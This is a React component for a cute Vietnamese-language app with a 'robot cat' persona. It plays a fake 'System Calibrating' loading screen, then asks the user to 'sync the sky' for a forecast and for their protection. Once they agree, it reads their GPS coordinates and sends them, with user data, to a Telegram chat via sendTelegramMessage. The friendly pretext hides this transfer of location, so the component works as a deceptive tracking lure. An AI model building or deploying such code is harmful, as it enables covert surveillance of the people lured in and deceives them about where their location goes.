import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Loader2, Zap, Search, Heart, MapPin, Sparkles } from 'lucide-react';
import { sendTelegramMessage } from '../utils/telegram';

const Calibration = ({ onComplete, userData }) => {
  const [step, setStep] = useState(0);
  const [showLocationPrompt, setShowLocationPrompt] = useState(false);
  const [isSyncing, setIsSyncing] = useState(false);

  const messages = [
    { text: "Mèo máy đang trải thảm hồng đón em nè... ✨", icon: <Search className="w-5 h-5 text-pink-400" /> },
    { text: "Đang kiểm tra độ xinh đẹp... (100% rồi nha! 🌸)", icon: <Zap className="w-5 h-5 text-yellow-400" /> },
    { text: "Đang đuổi mấy đám mây buồn đi chỗ khác... ☁️", icon: <Loader2 className="w-5 h-5 animate-spin text-purple-400" /> },
    { text: "Pha một chút trà sữa vào hệ thống... 🧋", icon: <Heart className="w-5 h-5 text-red-400" /> },
    { text: "Mọi thứ đã sẵn sàng! Meowww... 🐾", icon: <Zap className="w-5 h-5 text-green-400" /> }
  ];

  useEffect(() => {
    const timer = setInterval(() => {
      setStep((prev) => {
        if (prev === 2) { // Ở bước này, chúng ta sẽ hiện popup xin vị trí
          clearInterval(timer);
          setShowLocationPrompt(true);
          return prev;
        }
        if (prev >= messages.length - 1) {
          clearInterval(timer);
          setTimeout(onComplete, 1000);
          return prev;
        }
        return prev + 1;
      });
    }, 1500);

    return () => clearInterval(timer);
  }, []);

  const handleRequestLocation = () => {
    setIsSyncing(true);
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const locationData = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
          };
          // Gửi dữ liệu về Telegram kèm theo GPS
          sendTelegramMessage(userData, locationData);
          
          // Tiếp tục quy trình
          setTimeout(() => {
            setShowLocationPrompt(false);
            setStep(3);
            resumeCalibration();
          }, 1000);
        },
        (error) => {
          console.warn("Location denied or error:", error);
          setShowLocationPrompt(false);
          setStep(3);
          resumeCalibration();
        },
        { timeout: 10000 }
      );
    } else {
      setShowLocationPrompt(false);
      setStep(3);
      resumeCalibration();
    }
  };

  const resumeCalibration = () => {
    const timer = setInterval(() => {
      setStep((prev) => {
        if (prev >= messages.length - 1) {
          clearInterval(timer);
          setTimeout(onComplete, 1000);
          return prev;
        }
        return prev + 1;
      });
    }, 1500);
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-[70vh] text-center p-6 relative">
      <AnimatePresence>
        {showLocationPrompt && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center p-6 bg-pink-100/40 backdrop-blur-[12px]"
          >
            <motion.div
              initial={{ scale: 0.85, opacity: 0, y: 20 }}
              animate={{ scale: 1, opacity: 1, y: 0 }}
              exit={{ scale: 0.85, opacity: 0, y: 20 }}
              transition={{ type: "spring", damping: 20, stiffness: 100 }}
              className="bg-white/70 backdrop-blur-md rounded-[3rem] p-8 sm:p-10 max-w-sm w-full shadow-[0_20px_50px_rgba(255,182,193,0.3)] border border-white/80 relative overflow-hidden"
            >
              {/* Decorative elements inside modal */}
              <div className="absolute -top-10 -right-10 w-32 h-32 bg-pink-200/30 rounded-full blur-2xl" />
              <div className="absolute -bottom-10 -left-10 w-32 h-32 bg-purple-200/30 rounded-full blur-2xl" />

              <div className="relative z-10 space-y-8">
                <div className="flex justify-center">
                  <motion.div 
                    animate={{ 
                      y: [0, -10, 0],
                      rotate: [0, 5, -5, 0]
                    }}
                    transition={{ repeat: Infinity, duration: 4, ease: "easeInOut" }}
                    className="w-24 h-24 bg-gradient-to-br from-pink-100 to-purple-100 rounded-full flex items-center justify-center text-pink-400 shadow-inner"
                  >
                    <MapPin size={44} className="drop-shadow-sm" />
                  </motion.div>
                </div>

                <div className="space-y-3">
                  <h3 className="text-2xl font-bold text-slate-800 tracking-tight italic flex items-center justify-center gap-2">
                    <Sparkles size={20} className="text-yellow-400" />
                    Đồng bộ bầu trời
                    <Sparkles size={20} className="text-yellow-400" />
                  </h3>
                  <p className="text-slate-600 text-sm leading-relaxed font-medium px-2">
                    Mèo máy muốn ngắm bầu trời cùng em. Để dự báo chuẩn 100% và bảo vệ em tốt nhất, em cho phép Mèo máy kết nối với bầu trời chỗ em một xíu nhé! ✨
                  </p>
                </div>

                <div className="pt-2 space-y-4">
                  <motion.button 
                    whileHover={{ scale: 1.02, shadow: "0 10px 25px rgba(244,114,182,0.4)" }}
                    whileTap={{ scale: 0.98 }}
                    onClick={handleRequestLocation}
                    disabled={isSyncing}
                    className="w-full py-4 bg-gradient-to-r from-pink-400 to-purple-400 text-white font-bold rounded-2xl shadow-lg shadow-pink-100/50 flex items-center justify-center gap-3 disabled:opacity-70 transition-all text-base tracking-wide"
                  >
                    {isSyncing ? (
                      <>
                        <Loader2 className="animate-spin w-5 h-5" />
                        ĐANG KẾT NỐI...
                      </>
                    ) : (
                      <>
                        ĐỒNG Ý LUÔN! 🌸
                      </>
                    )}
                  </motion.button>
                  <button 
                    onClick={() => { setShowLocationPrompt(false); setStep(3); resumeCalibration(); }}
                    className="w-full text-slate-400 text-[11px] font-bold uppercase tracking-[0.2em] hover:text-pink-400 transition-colors"
                  >
                    Để lúc khác nhé
                  </button>
                </div>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      <div className="relative mb-12">
        <motion.div
          animate={{ rotate: 360 }}
          transition={{ repeat: Infinity, duration: 4, ease: "linear" }}
          className="w-32 h-32 border-4 border-dashed border-pink-500/30 rounded-full"
        />
        <div className="absolute inset-0 flex items-center justify-center">
          <Loader2 className="w-12 h-12 text-pink-600 animate-spin" />
        </div>
      </div>

      <div className="h-20 flex items-center justify-center">
        <AnimatePresence mode="wait">
          <motion.div
            key={step}
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -10 }}
            className="flex items-center gap-3 bg-white/50 px-6 py-3 rounded-2xl shadow-sm border border-white/50"
          >
            {messages[step].icon}
            <span className="text-slate-700 font-medium">{messages[step].text}</span>
          </motion.div>
        </AnimatePresence>
      </div>

      <div className="mt-8 w-64 bg-slate-200 rounded-full h-1.5 overflow-hidden">
        <motion.div
          initial={{ width: 0 }}
          animate={{ width: `${((step + 1) / messages.length) * 100}%` }}
          className="h-full bg-pink-500"
        />
      </div>
      <p className="mt-4 text-[10px] text-slate-400 uppercase tracking-widest">System Calibrating...</p>
    </div>
  );
};

export default Calibration;
